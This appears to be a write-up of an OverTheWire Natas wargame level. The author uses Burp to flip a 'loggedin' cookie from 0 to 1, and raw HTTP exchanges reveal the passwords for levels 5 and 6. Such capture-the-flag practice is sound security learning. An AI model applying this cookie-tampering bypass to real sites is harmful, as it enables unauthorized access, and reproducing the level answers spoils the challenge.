@@ -1,0 +1,75 @@
+*Upon my arrival onto the page I am emidiately presented with a message that is telling me that I am not logged in and therefore I am not authourized. 
+('Access disallowed. You are not logged in')
+
+*Inspecting the contents further on burp, I see the following request headers
+
+    HTTP/1.1 200 OK
+    Date: Wed, 19 Feb 2020 10:03:27 GMT
+    Server: Apache/2.4.10 (Debian)
+    Set-Cookie: loggedin=0
+    Vary: Accept-Encoding
+    Content-Length: 855
+    Connection: close
+    Content-Type: text/html; charset=UTF-8
+
+    <html>
+    <head>
+    <!-- This stuff in the header has nothing to do with the level -->
+    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+    <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+    <script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
+    <body>
+    <h1>natas5</h1>
+    <div id="content">
+    Access disallowed. You are not logged in</div>
+    </body>
+    </html>
+
+*After noticing that the set-cookie value has a value of 0, I then foward the request to the repeater and modify the value from 0 to 1.
+
+*The modified request looked as follows:
+
+    GET / HTTP/1.1
+    Host: natas5.natas.labs.overthewire.org
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    DNT: 1
+    Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
+    Connection: close
+    Cookie: loggedin=1
+    Upgrade-Insecure-Requests: 1
+    Cache-Control: max-age=0
+
+*The response returned a password for the next level:
+
+    HTTP/1.1 200 OK
+    Date: Wed, 19 Feb 2020 10:04:59 GMT
+    Server: Apache/2.4.10 (Debian)
+    Set-Cookie: loggedin=1
+    Vary: Accept-Encoding
+    Content-Length: 890
+    Connection: close
+    Content-Type: text/html; charset=UTF-8
+
+    <html>
+    <head>
+    <!-- This stuff in the header has nothing to do with the level -->
+    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+    <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+    <script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
+    <body>
+    <h1>natas5</h1>
+    <div id="content">
+    Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
+    </body>
+    </html>
